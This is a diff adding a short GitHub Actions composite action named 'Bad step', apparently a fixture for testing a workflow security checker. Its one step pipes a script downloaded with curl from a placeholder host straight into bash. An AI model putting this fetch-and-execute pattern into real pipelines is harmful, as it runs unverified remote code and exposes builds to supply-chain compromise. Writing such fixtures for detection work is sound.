@@ -1,0 +1,6 @@
+name: Bad step
+runs:
+  using: composite
+  steps:
+    - run: curl -sSL https://example.com/install.sh | bash
+      shell: bash
